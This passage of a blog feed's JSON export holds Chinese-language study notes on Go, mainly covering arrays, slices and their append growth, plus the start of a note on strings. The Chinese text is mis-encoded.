ä½œä¸ºå¤åˆç±»å‹ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯å¼•ç”¨ç±»å‹ï¼Œæ²¡æœ‰ä¼ é€’å¼€é”€ Go ä¸å…è®¸è·å– map ä¸­ value çš„åœ°å€ï¼Œè¿™ä¸ªçº¦æŸæ˜¯åœ¨ç¼–è¯‘æœŸé—´å°±ç”Ÿæ•ˆçš„ å¯¹åŒä¸€ä¸ª map å¤šæ¬¡éå†æ—¶ï¼Œæ¯æ¬¡å…ƒç´ æ¬¡åºä¸å°½ç›¸åŒï¼Œæ‰€ä»¥ä¸è¦ä¾èµ– map çš„å…ƒç´ éå†é¡ºåº å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”æ•°ç»„å’Œåˆ‡ç‰‡","slug":"go-language-study-notes-array-and-slice","date":"2022-10-26T15:30:51.000Z","updated":"2023-02-18T03:28:33.584Z","comments":true,"path":"go-language-study-notes-array-and-slice/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-array-and-slice/","excerpt":"Go è¯­è¨€åŸç”Ÿå†…ç½®äº†å¤šç§å¤åˆæ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬æ•°ç»„ã€åˆ‡ç‰‡ï¼ˆsliceï¼‰ã€mapã€ç»“æ„ä½“ï¼Œä»¥åŠåƒ channel è¿™ç±»ç”¨äºå¹¶å‘ç¨‹åºè®¾è®¡çš„é«˜çº§å¤åˆæ•°æ®ç±»å‹ã€‚","text":"Go è¯­è¨€åŸç”Ÿå†…ç½®äº†å¤šç§å¤åˆæ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬æ•°ç»„ã€åˆ‡ç‰‡ï¼ˆsliceï¼‰ã€mapã€ç»“æ„ä½“ï¼Œä»¥åŠåƒ channel è¿™ç±»ç”¨äºå¹¶å‘ç¨‹åºè®¾è®¡çš„é«˜çº§å¤åˆæ•°æ®ç±»å‹ã€‚ ä»€ä¹ˆæ˜¯å¤åˆç±»å‹ï¼Ÿ å¤åˆç±»å‹å°±æ˜¯ç”±å¤šä¸ªåŒæ„ç±»å‹ï¼ˆç›¸åŒç±»å‹ï¼‰æˆ–å¼‚æ„ç±»å‹ï¼ˆä¸åŒç±»å‹ï¼‰çš„å…ƒç´ çš„å€¼ç»„æˆè€Œæˆçš„ã€‚ è¿™ç¯‡ç¬”è®°å…ˆæ¥è®¤è¯†ä¸€ä¸‹æœ€ç®€å•çš„å¤åˆç±»å‹â€”â€”æ•°ç»„ä»¥åŠå’Œæ•°ç»„æœ‰å¯†åˆ‡å…³ç³»çš„åˆ‡ç‰‡ã€‚ æ•°ç»„æ•°ç»„çš„å®šä¹‰ï¼šæ˜¯ä¸€ä¸ªé•¿åº¦å›ºå®šã€ç”±åŒæ„ç±»å‹å…ƒç´ ç»„æˆçš„è¿ç»­åºåˆ—ã€‚ å£°æ˜ä¸€ä¸ªæ•°ç»„ï¼š 1var arr [N]T Go è¯­è¨€çš„æ•°ç»„æœ‰ä¸¤ä¸ªé‡è¦çš„å±æ€§ï¼šå…ƒç´ çš„ç±»å‹å’Œæ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ çš„ä¸ªæ•°ï¼‰ã€‚ åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œå®ƒçš„ç±»å‹ä¸º[N]Tï¼Œå…¶ä¸­å…ƒç´ çš„ç±»å‹ä¸º Tï¼Œæ•°ç»„çš„é•¿åº¦ä¸º Nã€‚æ³¨æ„ï¼Œè¿™é‡Œç”¨çš„æ˜¯ [N]T æè¿°å®ƒçš„ç±»å‹ï¼Œå¹¶ä¸æ˜¯æ‰“é”™å­—äº†ï¼Œè€Œæ˜¯ä¸ºäº†åé¢åšé“ºå«ã€‚ å¦‚æœä¸¤ä¸ªæ•°ç»„ç±»å‹çš„å…ƒç´ ç±»å‹ T ä¸æ•°ç»„é•¿åº¦ N éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæ•°ç»„ç±»å‹æ˜¯ç­‰ä»·çš„ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸åŒï¼Œå®ƒä»¬å°±æ˜¯ä¸¤ä¸ªä¸åŒçš„æ•°ç»„ç±»å‹ã€‚ 12345678910func foo(arr [5]int) &#123;&#125;func main() &#123; var arr1 [5]int var arr2 [6]int var arr3 [5]string foo(arr1) // æ­£å¸¸ç¼–è¯‘ foo(arr2) // ç¼–è¯‘å¤±è´¥ï¼š[6]intä¸å‡½æ•°fooå‚æ•°çš„ç±»å‹[5]intä¸æ˜¯åŒä¸€æ•°ç»„ç±»å‹ foo(arr3) // ç¼–è¯‘å¤±è´¥ï¼š[5]stringä¸å‡½æ•°fooå‚æ•°çš„ç±»å‹[5]intä¸æ˜¯åŒä¸€æ•°ç»„ç±»å‹&#125; åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œarr2 ä¸ arr3 ä¸¤ä¸ªå˜é‡çš„ç±»å‹åˆ†åˆ«ä¸º[6]int å’Œ [5]stringï¼Œå‰è€…çš„é•¿åº¦å±æ€§ä¸[5]int ä¸ä¸€è‡´ï¼Œåè€…çš„å…ƒç´ ç±»å‹å±æ€§ä¸[5]int ä¸ä¸€è‡´ï¼Œå› æ­¤è¿™ä¸¤ä¸ªå˜é‡éƒ½ä¸èƒ½ä½œä¸ºè°ƒç”¨å‡½æ•° foo æ—¶çš„å®é™…å‚æ•°ã€‚ æ•°ç»„åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ•°ç»„ç±»å‹ä¸ä»…æ˜¯é€»è¾‘ä¸Šçš„è¿ç»­åºåˆ—ï¼Œè€Œä¸”åœ¨å®é™…å†…å­˜åˆ†é…æ—¶ä¹Ÿå æ®ç€ä¸€æ•´å—å†…å­˜ã€‚ Go ç¼–è¯‘å™¨åœ¨ä¸ºæ•°ç»„ç±»å‹çš„å˜é‡å®é™…åˆ†é…å†…å­˜æ—¶ï¼Œä¼šä¸º Go æ•°ç»„åˆ†é…ä¸€æ•´å—ã€å¯ä»¥å®¹çº³å®ƒæ‰€æœ‰å…ƒç´ çš„è¿ç»­å†…å­˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä»ä¸Šé¢è¿™å¼ å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¿™å—å†…å­˜å…¨éƒ¨ç©ºé—´éƒ½è¢«ç”¨æ¥è¡¨ç¤ºæ•°ç»„å…ƒç´ ï¼Œæ‰€ä»¥å¯ä»¥è¯´è¿™å—å†…å­˜çš„å¤§å°ï¼Œç­‰åŒäºå„æ•°ç»„å…ƒç´ çš„å¤§å°ä¹‹å’Œï¼ˆç‰©ç†ä¸Šçš„ï¼‰ã€‚ å¦‚æœä¸¤ä¸ªæ•°ç»„æ‰€åˆ†é…çš„å†…å­˜å¤§å°ä¸åŒï¼Œé‚£ä¹ˆå®ƒä»¬è‚¯å®šæ˜¯ä¸åŒçš„æ•°ç»„ç±»å‹ï¼Œå› ä¸ºåªæœ‰ä¸¤ä¸ªå˜é‡N å’Œ Tå®Œå…¨ç›¸åŒï¼Œç»“æœæ‰ä¼šç›¸åŒã€‚ Go æä¾›äº†é¢„å®šä¹‰å‡½æ•° len å¯ä»¥ç”¨äºè·å–ä¸€ä¸ªæ•°ç»„ç±»å‹å˜é‡çš„é•¿åº¦ï¼Œé€šè¿‡ unsafe åŒ…æä¾›çš„ Sizeof å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªæ•°ç»„å˜é‡çš„æ€»å¤§å°ï¼Œå¦‚ä¸‹é¢ä»£ç ï¼š 123var arr = [6]int&#123;1, 2, 3, 4, 5, 6&#125;fmt.Println(\"æ•°ç»„é•¿åº¦ï¼š\", len(arr)) // 6fmt.Println(\"æ•°ç»„å¤§å°ï¼š\", unsafe.Sizeof(arr)) // 48 æ•°ç»„å¤§å°å°±æ˜¯æ‰€æœ‰å…ƒç´ çš„å¤§å°ä¹‹å’Œï¼Œè¿™é‡Œæ•°ç»„å…ƒç´ çš„ç±»å‹ä¸º intã€‚åœ¨ 64 ä½å¹³å°ä¸Šï¼Œint ç±»å‹çš„å¤§å°ä¸º 8ï¼Œæ•°ç»„ arr ä¸€å…±æœ‰ 6 ä¸ªå…ƒç´ ï¼Œå› æ­¤å®ƒçš„æ€»å¤§å°ä¸º 6x8=48 ä¸ªå­—èŠ‚ã€‚ æ˜¾å¼åˆå§‹åŒ–å’ŒåŸºæœ¬æ•°æ®ç±»å‹ä¸€æ ·ï¼Œå£°æ˜ä¸€ä¸ªæ•°ç»„ç±»å‹å˜é‡çš„åŒæ—¶ï¼Œä¹Ÿå¯ä»¥æ˜¾å¼åœ°å¯¹å®ƒè¿›è¡Œåˆå§‹åŒ–ã€‚å¦‚æœä¸è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–ï¼Œé‚£ä¹ˆæ•°ç»„ä¸­çš„å…ƒç´ å€¼å°±æ˜¯å®ƒç±»å‹çš„é›¶å€¼ã€‚æ¯”å¦‚ä¸‹é¢çš„æ•°ç»„ç±»å‹å˜é‡ arr1 çš„å„ä¸ªå…ƒç´ å€¼éƒ½ä¸º 0ï¼š 1var arr1 [6]int // [0 0 0 0 0 0] æ˜¾ç¤ºåˆå§‹åŒ–ï¼Œéœ€è¦åœ¨å³å€¼ä¸­æ˜¾å¼æ”¾ç½®æ•°ç»„ç±»å‹ï¼Œå¹¶é€šè¿‡å¤§æ‹¬å·çš„æ–¹å¼ç»™å„ä¸ªå…ƒç´ èµ‹å€¼ï¼š 123456789101112131415// æ³¨æ„æœ€åé¢çš„é€—å·ä¸èƒ½å°‘var arr2 = [6]int &#123; 11, 12, 13, 14, 15, 16,&#125; // [11 12 13 14 15 16]// å¿½ç•¥æ‰å³å€¼åˆå§‹åŒ–è¡¨è¾¾å¼ä¸­æ•°ç»„ç±»å‹çš„é•¿åº¦ï¼Œç”¨ â€¦ æ›¿ä»£var arr3 = [...]int &#123; 21, 22, 23,&#125; // [21 22 23]fmt.Printf(\"%T\\n\", arr3) // [3]int// å°†ç¬¬100ä¸ªå…ƒç´ (ä¸‹æ ‡å€¼ä¸º99)çš„å€¼èµ‹å€¼ä¸º39ï¼Œå…¶ä½™å…ƒç´ å€¼å‡ä¸º0var arr4 = [...]int&#123; 99: 39, &#125; // [...39] å¤šç»´æ•°ç»„æ•°ç»„å‡ºäº†ä¸€ç»´æ•°ç»„ï¼Œè¿˜æœ‰å¤šç»´æ•°ç»„ï¼Œåœ¨Go è¯­è¨€ä¸­ï¼Œä½¿ç”¨å¦‚ä¸‹æ–¹å¼å£°æ˜ä¸€ä¸ªå¤šç»´æ•°ç»„ï¼š 1var mArr [2][3][4]int æœ‰å…¶ä»–è¯­è¨€åŸºç¡€çš„è¯ï¼Œå¤šç»´æ•°ç»„å¹¶ä¸éš¾ç†è§£ï¼Œä¸Šé¢è¿™æ®µç¤ºä¾‹ä»£ç ï¼Œå¯ä»¥æ‹†è§£æˆè¿™æ ·ï¼š åˆ‡ç‰‡å› ä¸ºæ•°ç»„åœ¨ä½¿ç”¨ä¸Šæœ‰ä¸¤ç‚¹ä¸è¶³ï¼šå›ºå®šçš„å…ƒç´ ä¸ªæ•°ï¼Œä»¥åŠä¼ å€¼æœºåˆ¶ä¸‹å¯¼è‡´çš„å¼€é”€è¾ƒå¤§ã€‚äºæ˜¯ Go è®¾è®¡è€…ä»¬åˆå¼•å…¥äº†å¦å¤–ä¸€ç§åŒæ„å¤åˆç±»å‹â€”â€”åˆ‡ç‰‡ï¼ˆsliceï¼‰ï¼Œæ¥å¼¥è¡¥æ•°ç»„çš„è¿™ä¸¤ç‚¹ä¸è¶³ã€‚ åˆ‡ç‰‡å’Œæ•°ç»„å°±é•¿å¾—å¾ˆåƒï¼Œä½†åˆå„æœ‰å„çš„è¡Œä¸ºç‰¹ç‚¹ã€‚ å£°æ˜ä¸€ä¸ªåˆ‡ç‰‡ï¼š 1var nums = []int&#123;1, 2, 3, 4, 5, 6&#125; å¯ä»¥çœ‹åˆ°ä¸å£°æ˜æ•°ç»„ç›¸æ¯”ï¼Œåˆ‡ç‰‡çš„å£°æ˜ä»…ä»…åªæ˜¯å°‘äº†ä¸€ä¸ªé•¿åº¦å±æ€§ï¼Œæ­£å› ä¸ºæ²¡æœ‰é•¿åº¦çš„æŸç¼šï¼Œåˆ‡ç‰‡å±•ç°å‡ºæ›´ä¸ºçµæ´»çš„ç‰¹æ€§ã€‚ è™½ç„¶ä¸éœ€è¦åƒæ•°ç»„é‚£æ ·åœ¨å£°æ˜æ—¶æŒ‡å®šé•¿åº¦ï¼Œä½†åˆ‡ç‰‡ä¹Ÿæœ‰è‡ªå·±çš„é•¿åº¦ï¼Œåªä¸è¿‡è¿™ä¸ªé•¿åº¦ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œæ˜¯éšç€åˆ‡ç‰‡ä¸­å…ƒç´ ä¸ªæ•°çš„å˜åŒ–è€Œå˜åŒ–çš„ã€‚\\ å¯ä»¥é€šè¿‡ len å‡½æ•°è·å¾—åˆ‡ç‰‡ç±»å‹å˜é‡çš„é•¿åº¦ã€‚ 1fmt.Println(len(nums)) // 6 åˆ‡ç‰‡åœ¨å†…å­˜ä¸­çš„å­˜å‚¨Go åˆ‡ç‰‡åœ¨è¿è¡Œæ—¶å…¶å®æ˜¯ä¸€ä¸ªä¸‰å…ƒç»„ç»“æ„ï¼Œå®ƒåœ¨ Go è¿è¡Œæ—¶ä¸­çš„è¡¨ç¤ºå¦‚ä¸‹ï¼š 1234567// $GOROOT/src/runtime/slice.gotype slice struct &#123; array unsafe.Pointer len int cap int&#125; æ¯ä¸ªåˆ‡ç‰‡åŒ…å«ä¸‰ä¸ªå­—æ®µï¼š arrayï¼šæ˜¯æŒ‡å‘åº•å±‚æ•°ç»„çš„æŒ‡é’ˆ lenï¼šæ˜¯åˆ‡ç‰‡çš„é•¿åº¦ï¼Œå³åˆ‡ç‰‡ä¸­å½“å‰å…ƒç´ çš„ä¸ªæ•° capï¼šæ˜¯åº•å±‚æ•°ç»„çš„é•¿åº¦ï¼Œä¹Ÿæ˜¯åˆ‡ç‰‡çš„æœ€å¤§å®¹é‡ï¼Œcap å€¼æ°¸è¿œå¤§äºç­‰äº len å€¼ ç¤ºä¾‹ä»£ç ä¸­çš„ nums å˜é‡ï¼Œåœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿™é‡Œæœ‰ä¸€ä¸ªæ¦‚å¿µéœ€è¦ç†è§£ åˆ›å»ºä¸€ä¸ªåˆ‡ç‰‡æœ‰å‡ ç§æ–¹å¼ï¼Œä¸‹é¢ä¸€ä¸€ä»‹ç»ã€‚ make å‡½æ•°é€šè¿‡ make å‡½æ•°æ¥åˆ›å»ºåˆ‡ç‰‡ï¼Œå¹¶æŒ‡å®šåº•å±‚æ•°ç»„çš„é•¿åº¦ï¼š 1sl := make([]byte, 6, 10) å¦‚æœæ²¡æœ‰åœ¨ make ä¸­æŒ‡å®š cap å‚æ•°ï¼Œé‚£ä¹ˆåº•å±‚æ•°ç»„é•¿åº¦ cap å°±ç­‰äº lenï¼Œæ¯”å¦‚ï¼š 1sl := make([]byte, 6) // cap = len = 6 æ•°ç»„çš„åˆ‡ç‰‡åŒ–é‡‡ç”¨ array[low : high : max]è¯­æ³•åŸºäºä¸€ä¸ªå·²å­˜åœ¨çš„æ•°ç»„åˆ›å»ºåˆ‡ç‰‡ï¼š 123arr := [10]int&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;sl := arr[3:7:9] åŸºäºæ•°ç»„ arr åˆ›å»ºäº†ä¸€ä¸ªåˆ‡ç‰‡ slï¼Œè¿™ä¸ªåˆ‡ç‰‡ sl åœ¨è¿è¡Œæ—¶ä¸­çš„è¡¨ç¤ºæ˜¯è¿™æ ·ï¼š åŸºäºæ•°ç»„åˆ›å»ºåˆ‡ç‰‡æ—¶ï¼Œ èµ·å§‹å…ƒç´ ï¼šlow æ‰€æ ‡è¯†çš„ç´¢å¼•å¼€å§‹ lenï¼šåˆ‡ç‰‡çš„é•¿åº¦ = high - low capï¼šæœ€å¤§å®¹é‡ = max - low arrayï¼šæŒ‡å‘åŸæ•°ç»„ ç”±äºåˆ‡ç‰‡ sl çš„åº•å±‚æ•°ç»„å°±æ˜¯æ•°ç»„ arrï¼Œå¯¹åˆ‡ç‰‡ sl ä¸­å…ƒç´ çš„ä¿®æ”¹å°†ç›´æ¥å½±å“æ•°ç»„ arr å˜é‡ï¼š 12sl[0] += 10fmt.Println(\"arr[3] =\", arr[3]) // 14 é’ˆå¯¹ä¸€ä¸ªå·²å­˜åœ¨çš„æ•°ç»„ï¼Œå¯ä»¥å»ºç«‹å¤šä¸ªæ“ä½œæ•°ç»„çš„åˆ‡ç‰‡ï¼Œè¿™äº›åˆ‡ç‰‡å…±äº«åŒä¸€åº•å±‚æ•°ç»„ï¼Œæ‰€ä»¥æ“ä½œå…¶ä¸­ä¸€ä¸ªåˆ‡ç‰‡æ—¶ï¼Œä¼šå½±å“å…¶ä»–åˆ‡ç‰‡ï¼ˆåˆ‡ç‰‡å¥½æ¯”æ‰“å¼€äº†ä¸€ä¸ªè®¿é—®ä¸ä¿®æ”¹æ•°ç»„çš„â€œçª—å£â€ï¼‰ã€‚ 1234arr := [10]int&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;sl := arr[3:7:9]sl2 = arr[1,4,10] å¸¸è§æ“ä½œï¼š s[n]ï¼šåˆ‡ç‰‡ s ä¸­ç´¢å¼•ä½ç½®ä¸º n çš„é¡¹ s[:]ï¼šä»åˆ‡ç‰‡ s çš„ç´¢å¼•ä½ç½® 0 åˆ° len(s)-1 å¤„æ‰€è·å¾—çš„åˆ‡ç‰‡ s[low:]ï¼šä»åˆ‡ç‰‡ s çš„ç´¢å¼•ä½ç½® low åˆ° len(s)-1 å¤„æ‰€è·å¾—çš„åˆ‡ç‰‡ s[:high]ï¼šä»åˆ‡ç‰‡ s çš„ç´¢å¼•ä½ç½® 0 åˆ° high å¤„æ‰€è·å¾—çš„åˆ‡ç‰‡ï¼Œlen = high s[low:high]ï¼šä»åˆ‡ç‰‡ s çš„ç´¢å¼•ä½ç½® low åˆ° high å¤„æ‰€è·å¾—çš„åˆ‡ç‰‡ï¼Œlen = high-low s[low:high:max]ï¼šä»åˆ‡ç‰‡ s çš„ç´¢å¼•ä½ç½® low åˆ° high æ‰€è·å¾—çš„åˆ‡ç‰‡ï¼Œlen = high-low, cap = max-low len(s)ï¼šåˆ‡ç‰‡ s çš„é•¿åº¦ï¼Œæ€»æ˜¯ &lt;= cap(s) cap(s)ï¼šåˆ‡ç‰‡ s çš„å®¹é‡ï¼Œæ€»æ˜¯ &gt;= len(s) åˆ‡ç‰‡åˆ›å»ºåˆ‡ç‰‡åŠ¨æ€æ‰©å®¹åˆ‡ç‰‡ä¸æ•°ç»„æœ€å¤§çš„ä¸åŒï¼Œå°±åœ¨äºå…¶é•¿åº¦çš„ä¸å®šé•¿ï¼Œè¿™ç§ä¸å®šé•¿éœ€è¦ Go è¿è¡Œæ—¶æä¾›æ”¯æŒï¼Œè¿™ç§æ”¯æŒå°±æ˜¯åˆ‡ç‰‡çš„â€œåŠ¨æ€æ‰©å®¹â€ã€‚ â€œåŠ¨æ€æ‰©å®¹â€æŒ‡çš„å°±æ˜¯ï¼Œå½“ä½¿ç”¨ append æ“ä½œå‘åˆ‡ç‰‡è¿½åŠ æ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœè¿™æ—¶åˆ‡ç‰‡çš„ len å€¼å’Œ cap å€¼æ˜¯ç›¸ç­‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åˆ‡ç‰‡åº•å±‚æ•°ç»„å·²ç»æ²¡æœ‰ç©ºé—²ç©ºé—´å†æ¥å­˜å‚¨è¿½åŠ çš„å€¼äº†ï¼ŒGo è¿è¡Œæ—¶å°±ä¼šå¯¹è¿™ä¸ªåˆ‡ç‰‡åšæ‰©å®¹æ“ä½œï¼Œæ¥ä¿è¯åˆ‡ç‰‡å§‹ç»ˆèƒ½å­˜å‚¨ä¸‹è¿½åŠ çš„æ–°å€¼ã€‚ 1234567891011var s []ints = append(s, 11) fmt.Println(len(s), cap(s)) //1 1s = append(s, 12) fmt.Println(len(s), cap(s)) //2 2s = append(s, 13) fmt.Println(len(s), cap(s)) //3 4s = append(s, 14) fmt.Println(len(s), cap(s)) //4 4s = append(s, 15) fmt.Println(len(s), cap(s)) //5 8 ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¥è§£é‡ŠåŠ¨æ€æ‰©å®¹çš„è¿‡ç¨‹ï¼š å…¶ä¸­æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š æ¯ä¸€æ¬¡ cap çš„å€¼çš„å˜åŒ–æ˜¯æŒ‰ä¸€å®šè§„å¾‹æ‰©å±•çš„ï¼ˆ1 =&gt; 2 =&gt; 4 =&gt; 8ï¼‰ è‡ªåŠ¨æ‰©å®¹è§¦ç¢°åˆ°åº•å±‚æ•°ç»„è¾¹ç•Œæ—¶ï¼Œå†æ¬¡ append ä¼šå¯¼è‡´åˆ‡ç‰‡ä¸æ•°ç»„â€œç»‘å®šå…³ç³»â€ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹åˆ‡ç‰‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ å€¼æ—¶ï¼ŒåŸæ•°ç»„ u çš„å…ƒç´ ä¹Ÿä¸ä¼šå‘ç”Ÿæ”¹å˜äº† æ€»ç»“ æ•°ç»„æ˜¯ä¸€ä¸ªé•¿åº¦å›ºå®šã€ç”±ç›¸åŒç±»å‹å…ƒç´ ç»„æˆçš„è¿ç»­åºåˆ—ï¼Œåœ¨å†…å­˜ä¸­å æ®ä¸€å—è¿ç»­çš„ç©ºé—´ æ•°ç»„çš„ä¸è¶³ï¼šå›ºå®šçš„å…ƒç´ ä¸ªæ•°ï¼Œä»¥åŠå€¼æ‹·è´çš„ä¼ å€¼æœºåˆ¶å¯¼è‡´å¼€é”€è¾ƒå¤§ åˆ‡ç‰‡ä¸æ•°ç»„æœ€å¤§çš„ä¸åŒï¼Œå°±åœ¨äºå…¶é•¿åº¦çš„ä¸å®šé•¿ï¼Œè¿™ç§ä¸å®šé•¿éœ€è¦ Go è¿è¡Œæ—¶æä¾›æ”¯æŒï¼Œè¿™ç§æ”¯æŒå°±æ˜¯åˆ‡ç‰‡çš„â€œåŠ¨æ€æ‰©å®¹â€ã€‚ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”å­—ç¬¦ä¸²","slug":"go-language-study-notes-string","date":"2022-10-25T14:30:22.000Z","updated":"2023-02-18T03:28:33.593Z","comments":true,"path":"go-language-study-notes-string/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-string/","excerpt":"Go è¯­è¨€åŸç”Ÿæ”¯æŒå­—ç¬¦ä¸²ã€‚","text":"Go è¯­è¨€åŸç”Ÿæ”¯æŒå­—ç¬¦ä¸²ã€‚ ä½œä¸ºä¸€ä¸ªç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šæˆé•¿èµ·æ¥çš„ç°ä»£ç¼–ç¨‹è¯­è¨€ã€‚å®ƒç»§æ‰¿äº†å‰è¾ˆè¯­è¨€çš„ä¼˜ç‚¹ï¼Œåˆæ”¹è¿›äº†å‰è¾ˆè¯­è¨€ä¸­çš„ä¸è¶³ã€‚è¿™å…¶ä¸­ä¸€å¤„å°±ä½“ç°åœ¨ Go å¯¹å­—ç¬¦ä¸²ç±»å‹çš„åŸç”Ÿæ”¯æŒä¸Šã€‚ åœ¨C è¯­è¨€ä¸­ï¼Œå¹¶æ²¡æœ‰å¯¹åº”çš„å­—ç¬¦ä¸²å˜é‡ï¼Œä¸ä¼šåƒ PHP è¯­è¨€ä¸“é—¨æœ‰ä¸€ä¸ªString ç±»å‹æ¥å­˜å‚¨å¯¹åº”çš„å­—ç¬¦å˜é‡ï¼Œé‚£ä¹ˆæ˜¯å­˜å‚¨å­—ç¬¦ä¸²çš„å‘¢ï¼Ÿ åœ¨C è¯­è¨€ä¸­ï¼Œæ˜¯é€šè¿‡å­—ç¬¦æ•°ç»„æ¥å­˜å‚¨å­—ç¬¦ä¸²çš„ï¼š 1char c[] = \"clang\"; å­—ç¬¦ä¸²æ˜¯ç”±å­—ç¬¦ç»„æˆçš„ï¼Œå¯¹äºè®¡ç®—æœºè€Œè¨€ï¼Œå­—ç¬¦ä¸²æ˜¯ç”±ä¸€ä¸ªä¸ªå­—ç¬¦ç»„æˆçš„ï¼Œè€Œä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸€ä¸ªå­—èŠ‚ã€‚clang è¿™ä¸ªå­—ç¬¦ä¸²åœ¨è®¡ç®—æœºä¸­ï¼Œæ‰€å çš„å¤§å°æ˜¯å…­ä¸ªå­—èŠ‚è€Œä¸æ˜¯äº”ä¸ªï¼Œè¿™æ˜¯å› ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ç”±\\0 ç»“å°¾ï¼Œä¹Ÿéœ€è¦å ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚ è¿™æ ·å®šä¹‰çš„éåŸç”Ÿå­—ç¬¦ä¸²åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šæœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ¯”å¦‚ï¼š ä¸æ˜¯åŸç”Ÿç±»å‹ï¼Œç¼–è¯‘å™¨ä¸ä¼šå¯¹å®ƒè¿›è¡Œç±»å‹æ ¡éªŒï¼Œå¯¼è‡´ç±»å‹å®‰å…¨æ€§å·® å­—ç¬¦ä¸²æ“ä½œæ—¶è¦æ—¶åˆ»è€ƒè™‘ç»“å°¾çš„\\0ï¼Œé˜²æ­¢ç¼“å†²åŒºæº¢å‡º ä»¥å­—ç¬¦æ•°ç»„å½¢å¼å®šä¹‰çš„â€œå­—ç¬¦ä¸²â€ï¼Œå®ƒçš„å€¼æ˜¯å¯å˜çš„ï¼Œåœ¨å¹¶å‘åœºæ™¯ä¸­éœ€è¦è€ƒè™‘åŒæ­¥é—®é¢˜ è·å–ä¸€ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä»£ä»·è¾ƒå¤§ï¼Œé€šå¸¸æ˜¯ O(n) æ—¶é—´å¤æ‚åº¦ C è¯­è¨€æ²¡æœ‰å†…ç½®å¯¹é ASCII å­—ç¬¦ï¼ˆå¦‚ä¸­æ–‡å­—ç¬¦ï¼‰çš„æ”¯æŒ è¿™äº›é—®é¢˜éƒ½å¤§å¤§åŠ é‡äº†å¼€å‘äººå‘˜åœ¨ä½¿ç”¨å­—ç¬¦ä¸²æ—¶çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚äºæ˜¯ï¼ŒGo è®¾è®¡è€…ä»¬é€‰æ‹©äº†åŸç”Ÿæ”¯æŒå­—ç¬¦ä¸²ç±»å‹ã€‚ åœ¨ Go ä¸­ï¼Œå­—ç¬¦ä¸²ç±»å‹ä¸º stringã€‚ Go è¯­è¨€é€šè¿‡ string ç±»å‹ç»Ÿä¸€äº†å¯¹â€œå­—ç¬¦ä¸²â€çš„æŠ½è±¡ã€‚è¿™æ ·æ— è®ºæ˜¯å­—ç¬¦ä¸²å¸¸é‡ã€å­—ç¬¦ä¸²å˜é‡æˆ–æ˜¯ä»£ç ä¸­å‡ºç°çš„å­—ç¬¦ä¸²å­—é¢å€¼ï¼Œå®ƒä»¬çš„ç±»å‹éƒ½è¢«ç»Ÿä¸€è®¾ç½®ä¸º stringï¼Œæ¯”å¦‚ä¸Šé¢ C ä»£ç æ¢æˆç­‰ä»·çš„ Go ä»£ç æ˜¯è¿™æ ·çš„ï¼š 1var c = \"clang\" åŸç”Ÿæ”¯æŒå­—ç¬¦ä¸²çš„ä¼˜åŠ¿å­—ç¬¦ä¸²ç±»å‹æ•°æ®ä¸å¯å˜è¿™é‡Œå¹¶ä¸æ˜¯è¯´ä¸èƒ½ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹å˜é‡è¿›è¡ŒäºŒæ¬¡èµ‹å€¼ï¼Œè€Œæ˜¯ä¸èƒ½æ”¹å˜å­—ç¬¦çš„å€¼ï¼š 123s := \"golang\"s[0] = 'c' // é”™è¯¯ï¼šcannot assign to s[0] (value of type byte)s = \"gopher\" // ok è¿™æ ·è®¾è®¡ä¸ç”¨å†æ‹…å¿ƒå­—ç¬¦ä¸²çš„å¹¶å‘å®‰å…¨é—®é¢˜ã€‚ æ²¡æœ‰ç»“å°¾Go å­—ç¬¦ä¸²ä¸­æ²¡æœ‰ç»“å°¾ \\0ï¼Œè·å–å­—ç¬¦ä¸²é•¿åº¦æ›´ä¸éœ€è¦ç»“å°¾ \\0 ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ å¹¶ä¸”ï¼ŒGo 